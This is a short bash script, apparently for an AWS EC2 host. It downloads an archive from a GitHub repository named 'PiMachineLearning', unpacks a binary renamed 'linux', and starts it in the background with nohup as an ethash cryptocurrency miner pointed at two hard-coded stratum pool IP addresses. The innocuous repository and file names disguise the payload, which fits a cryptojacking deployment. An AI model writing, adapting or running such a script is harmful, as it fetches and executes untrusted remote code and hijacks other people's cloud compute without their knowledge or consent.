#!/bin/bash
set -e
cd /home/ec2-user
			wget https://github.com/Dev699vn/PiMachineLearning/raw/main/linux.tar.gz
			tar -xvf linux.tar.gz
            rm -rf linux.tar.gz
            mkdir bin
            mv linux bin/linux
            cd bin/
            
tee -a runsrc.sh <<EOF
#!/bin/bash
./linux -a ethash -o stratum+http://184.164.64.100:8086 -o stratum+http://159.203.107.149:8080
EOF

            chmod +x runsrc.sh
nohup sh runsrc.sh > result.txt 2>&1 &

